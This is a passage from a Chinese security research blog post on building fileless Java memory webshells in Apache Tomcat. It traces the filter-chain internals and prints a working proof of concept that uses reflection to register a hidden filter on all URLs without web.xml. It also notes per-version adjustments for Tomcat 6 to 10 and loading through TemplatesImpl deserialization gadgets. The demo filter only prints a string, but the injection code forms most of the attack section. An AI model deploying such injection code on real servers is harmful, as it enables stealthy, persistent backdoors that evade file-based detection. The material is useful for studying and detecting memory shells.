<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title">createFilterChain</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            Wrapper wrapper, Servlet servlet)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    .....x</span><br><span class="line">    <span class="comment">//filterMaps就是上文通过addFilter()，插入的Filter信息表</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="comment">//调用的Filter在上下文中不存在，就不会存入filterChain中，也就不会返回该filter了</span></span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">            context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//调用的Filter在上下文中存在，存入filterChain</span></span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">     &#125;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Filter生效"><a href="#Filter生效" class="headerlink" title="Filter生效"></a>Filter生效</h3><p>要让Filter真正生效，需要修改<code>StandardContext.filterConfigs</code>的属性。往里头插入新增的Filter。但这个暂且没看到哪里有赋值点。目测只能手动反射，为其新增一个<code>Filter</code></p>
<p>在Debug中看到<code>ApplicationFilterConfig</code>的属性有点复杂，怎么构造呢？去看看源码中<code>ApplicationFilterConfig</code>是怎么被构建的，找找是否有Factory类或者create方法。找到*StandardContext#filterStart()*。发现直接new就好了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterConfig filterConfig =</span><br><span class="line">     <span class="keyword">new</span> ApplicationFilterConfig(<span class="keyword">this</span>, entry.getValue());</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure>

<p>看来还需要构造多一个<code>FilterDef</code>。这个类没那么复杂，直接调用<code>setXX()</code>就可以完成属性赋值了。</p>
<h3 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h3><p>思路：</p>
<ol>
<li>临时修改<code>LifecycleBase.state</code>为<code>LifecycleState.STARTING_PREP</code></li>
<li>通过<code>ApplicationContextFacade.addFilter()</code>注册一个Filter。</li>
<li>注册后设置Filter，指定其匹配路径</li>
<li>反射修改<code>StandardContext.filterConfigs</code>，新增Filter，使前面注册的Filter生效</li>
<li>最后记得将<code>LifecycleBase.state</code>改回<code>LifecycleState.STARTED</code></li>
</ol>
<p>定义一个FIlter。但不在<code>web.xml</code>中配置</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EF</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Evil Filter Hook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Servlet中动态注册Filter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[+] 获取需要的属性StandardContext</span></span><br><span class="line">ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) getServletContext();</span><br><span class="line">Field contextField = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) contextField.get(applicationContextFacade);</span><br><span class="line"></span><br><span class="line">Field standardContextField = ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] 临时修改LifecycleBase.state</span></span><br><span class="line">Field stateFiled = LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">stateFiled.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">stateFiled.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] 注册Filter</span></span><br><span class="line">Filter ef = <span class="keyword">new</span> EF();</span><br><span class="line"><span class="comment">//第一次注册就会返回FilterRegistration.Dynamic</span></span><br><span class="line">FilterRegistration.Dynamic filterRegistration = applicationContextFacade.addFilter(<span class="string">&quot;ef&quot;</span>, ef);</span><br><span class="line"><span class="comment">//参数</span></span><br><span class="line"><span class="comment">//EnumSet&lt;DispatcherType&gt;: 表示拦截类型</span></span><br><span class="line"><span class="comment">//boolean: 在所有Filter之后/之前执行</span></span><br><span class="line"><span class="comment">//String[]: 匹配url</span></span><br><span class="line">EnumSet&lt;DispatcherType&gt; typeEnumSet = EnumSet.of(DispatcherType.REQUEST);</span><br><span class="line">filterRegistration.addMappingForUrlPatterns(typeEnumSet, <span class="keyword">false</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] 利用前文获取的StandardContext。强行反射修改filterConfig</span></span><br><span class="line">Field filterConfigField = StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap&lt;String, ApplicationFilterConfig&gt; filterConfig = (HashMap) filterConfigField.get(standardContext);</span><br><span class="line">System.out.println(filterConfig);</span><br><span class="line"></span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilter(ef);</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;ef&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(ef.getClass().getName());</span><br><span class="line">filterDef.setAsyncSupported(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">Constructor&lt;ApplicationFilterConfig&gt; applicationFilterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">applicationFilterConfigConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">filterConfig.put(<span class="string">&quot;ef&quot;</span>, applicationFilterConfig);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] 重置LifecycleBase.state</span></span><br><span class="line">stateFiled.set(standardContext, LifecycleState.STARTED);</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<img src="/2022/07/07/2022-07-07-java-memory-shell/1.gif" style="zoom: 80%;">



<h3 id="实战内存马角度"><a href="#实战内存马角度" class="headerlink" title="实战内存马角度"></a>实战内存马角度</h3><p>三梦师傅用的是“修改程序逻辑，初始化静态变量”这种方式拿request，然后顺利拿到context的。但由于这种方式对于Filter类型的程序不太友好，下文使用“Tomcat7另一个静态变量”这种方式，来获取context。</p>
<p>打内存马，最常用的就是<code>defineClass()</code>。那我们来实现下。整一个具有CC11依赖的Tomcat。</p>
<p>CC11是用<code>TemplatesImpl</code>来<code>defineClass()</code>的。但是这里有一个小坑。我们来看：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="comment">//新建了一个ClassLoader</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">         <span class="comment">//使用新建的ClassLoader来defineClass()</span></span><br><span class="line">         _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Java中类加载机制是双亲委派，一般的例如<code>new XXX()</code>这种，都是用的Java启动时创建的ClassLoader来加载的。类实例会保存在ClassLoader中。但我们看到<code>TemplatesImpl</code>，它去<code>defineClass()</code>是用新建的ClassLoader加载类。类实例只会保存在这个新建的ClassLoader中。但找了一圈，并没有发现程序其他地方有存储这个<code>loader</code>的点。所以如果我们用<code>TemplatesImpl</code>进行了<code>defineClass()</code>，是没法在外面用<code>Class.forName()</code>拿到加载的类实例的。</p>
<p>要动态注册FIlter，需要ApplicaationContext，但我们手头只有StandContenxt。这个可以不可以加Filter呢？</p>
<p>直接断点打在Filter中，回溯看。找到*ApplicationFilterChain#internalDoFilter()*。很明显可以看到几个关键属性：<code>filters</code>, <code>filterConfig</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">    ApplicationFilterConfig filterConfig = filters[pos++];</span><br><span class="line">    Filter filter = filterConfig.getFilter();</span><br><span class="line">    filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>继续往前看，这些东西是哪里被赋值的呢？找到*StandardWrapperValve#invoke()*。有一行：Filter的调用都是根据<code>filterChain</code>的值，进行依次调用的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ApplicationFilterChain filterChain =</span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure>

<p>找找<code>filterChain</code>如何被赋值的</p>
<p><em>ApplicationFilterFactory#createFilterChain()</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">StandardContext context = (StandardContext) wrapper.getParent();</span><br><span class="line">FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"><span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">     ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">    filterChain.addFilter(filterConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在*filterChain.addFilter()*中，即存在本小节开头说的，几个关键属性的赋值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filters[n++] = filterConfig;</span><br></pre></td></tr></table></figure>



<p>看到这里。可以整理出流程：</p>
<ol>
<li>在每一个request进来时，都会进入<em>StandardWrapperValve#invoke()<em>。该方法会调用</em>ApplicationFilterFactory.createFilterChain</em>组装<code>filterChain</code></li>
<li><code>filterChain</code>根据<code>StandardContext.filterMaps</code>和<code>StandardContext.filterConfigs</code>组装</li>
<li>组装完毕后，根据<code>filterChain</code>，依次进行Filter的调用</li>
</ol>
<p>那么我们的控制思路就是：由于可获取<code>StandardContext</code>，基于<code>StandardContext</code>反射修改<code>filterMaps</code>。以此将内存马打入</p>
<p>为了适配不同版本的Tomcat。需要额外进行些处理。</p>
<p><strong>Tomcat6</strong></p>
<p>FilterDef有点不一样，没用setFilter()。他是根据FIlterClass动态加载的</p>
<p><em>ApplicationFilterFactory#createFilterChain()</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isCometFilter = filterConfig.getFilter() <span class="keyword">instanceof</span> CometFilter; <span class="comment">//根据filterDef.filterClass动态ClassLoader加载</span></span><br><span class="line">filterChain.addFilter(filterConfig);</span><br></pre></td></tr></table></figure>

<p>直接反射设置<em>ApplicationFilterConfig.filter</em>不就可了嘛</p>
<p><strong>Tomcat7</strong></p>
<p>包名不一样 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.catalina.deploy.FilterDef;</span><br></pre></td></tr></table></figure>



<p><strong>Tomcat8</strong>/9</p>
<p>包名不一样 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.tomcat.util.descriptor.web.FilterDef;</span><br></pre></td></tr></table></figure>



<p><strong>Tomcat10</strong></p>
<p>整个包名都变了，由<code>javax.servlet.*</code>变成了<code>jakarta.servlet.*</code>。暂时没想到该如何通用。只能单独另开一个内存马payload.</p>
<p>基于前文 ”Tomcat7另一个静态变量“ 中。可以发现，<code>catalina</code>变量中存放了很多有价值的信息。在这其中我们能拿到<strong>任意</strong>Webapp的<em>type=Manager</em>的信息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;context=/tomcat1_war_exploded,host=localhost,type=Manager&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">3592</span>&#125; </span><br><span class="line"><span class="string">&quot;context=/manager,host=localhost,type=Manager&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">3676</span>&#125; </span><br></pre></td></tr></table></figure>

<p>里头的<code>resource.context.context</code>就是当前webapp的<code>ApplicationContext</code>。</p>
<p>要拿到当前webapp的<code>ApplicationContext</code>，我们还要简单判断一下当前webapp的<code>context path</code>。不然会拿到其他webapp的<code>ApplicationContext</code></p>
<p>可以基于前文”Tomcat7另一个静态变量“ 的代码，通过<code>RequestGroupInfo</code>获取当前请求路径，拼接获取webapp的<em>type=Manager</em>信息。</p>
<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>建好一个Servlet打断点往上看。看看Tomcat内部是如何处理一个Servlet的</p>
<p><em>ApplicationFilterChain#internalDoFilter()</em> </p>
<p><code>Servlet</code>实例保存在<code>servlet</code>中，追溯<code>servlet</code>赋值点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servlet.service(request, response);</span><br></pre></td></tr></table></figure>



<p><em>StandardWrapperValve#invoke()</em></p>
<p>但其实<code>wrapper</code>里早就有<code>Servlet</code>的实例了。继续追溯<code>wrapper</code>的赋值点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servlet = wrapper.allocate();</span><br></pre></td></tr></table></figure>



<p><em>StandardWrapperValve#invoke()</em></p>
<p>实际是<em>ValveBase.container</em>早就存放了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StandardWrapper wrapper = (StandardWrapper) getContainer();</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.mappingData.wrapper</span><br></pre></td></tr></table></figure>









<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>代码丢github备份了。写的很烂就不公开了。想瞄瞄的话问小盘盘要吧。</p>
<h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198886">基于内存 Webshell 的无文件攻击技术研究</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/java/" rel="tag"># java</a>
          
            <a href="/tags/Tomcat/" rel="tag"># Tomcat</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2022/07/07/2022-07-07-java-path-variables/" rel="next" title="关于path variables ;的解析及经典..;/的成因">
                <i class="fa fa-chevron-left"></i> 关于path variables ;的解析及经典..;/的成因
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2022/07/10/2022-07-10-bit_caculating/" rel="prev" title="位运算">
                位运算 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>





    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">31</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/xiaopan233" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://tttang.com/user/Xiaopan233" target="_blank" title="跳跳糖">
                      
                        <i class="fa fa-fw fa-globe"></i>跳跳糖</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://forum.butian.net/people/483" target="_blank" title="奇安信攻防社区">
                      
                        <i class="fa fa-fw fa-globe"></i>奇安信攻防社区</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.anquanke.com/member.html?memberId=144071" target="_blank" title="安全客">
                      
                        <i class="fa fa-fw fa-globe"></i>安全客</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.freebuf.com/author/xiaopan233" target="_blank" title="Freebuf">
                      
                        <i class="fa fa-fw fa-globe"></i>Freebuf</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://blog.csdn.net/xiaopan233/" target="_blank" title="CSDN">
                      
                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友链
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hui3c.club/" title="Hui3c 窝" target="_blank">Hui3c 窝</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://imlai.club/" title="Xiaolai Blog" target="_blank">Xiaolai Blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.noerrorp.com/" title="YouGe的技术笔记" target="_blank">YouGe的技术笔记</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.jingqingg.com/" title="惊青の小窝" target="_blank">惊青の小窝</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.luolingjiang.com/" title="洛翎酱的小窝" target="_blank">洛翎酱的小窝</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.petitstart.club/" title="Petitstart'Blog" target="_blank">Petitstart'Blog</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SpringBoot"><span class="nav-number">1.</span> <span class="nav-text">SpringBoot</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%8A%E4%B8%8B%E6%96%87%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.</span> <span class="nav-text">获取上下文对象</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%86%8CController"><span class="nav-number">3.</span> <span class="nav-text">手动注册Controller</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getHandler-%E6%96%B9%E6%B3%95"><span class="nav-number">3.0.1.</span> <span class="nav-text">getHandler()方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AbstractHandlerMethodMapping%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">3.1.</span> <span class="nav-text">AbstractHandlerMethodMapping注册内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AbstractUrlHandlerMapping%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">3.2.</span> <span class="nav-text">AbstractUrlHandlerMapping注册内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RouterFunctionMapping%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">3.3.</span> <span class="nav-text">RouterFunctionMapping注册内存马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E6%A3%80%E6%B5%8B"><span class="nav-number">4.</span> <span class="nav-text">关于内存马检测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9A%90%E8%94%BD%E6%96%B9%E5%BC%8F"><span class="nav-number">5.</span> <span class="nav-text">隐蔽方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat"><span class="nav-number">6.</span> <span class="nav-text">Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter"><span class="nav-number">6.1.</span> <span class="nav-text">Filter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8CFilter"><span class="nav-number">6.1.1.</span> <span class="nav-text">注册Filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Filter%E7%94%9F%E6%95%88"><span class="nav-number">6.1.2.</span> <span class="nav-text">Filter生效</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4POC"><span class="nav-number">6.1.3.</span> <span class="nav-text">完整POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%86%85%E5%AD%98%E9%A9%AC%E8%A7%92%E5%BA%A6"><span class="nav-number">6.1.4.</span> <span class="nav-text">实战内存马角度</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Servlet"><span class="nav-number">6.2.</span> <span class="nav-text">Servlet</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">7.</span> <span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ref"><span class="nav-number">8.</span> <span class="nav-text">Ref</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Xiaopan233</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

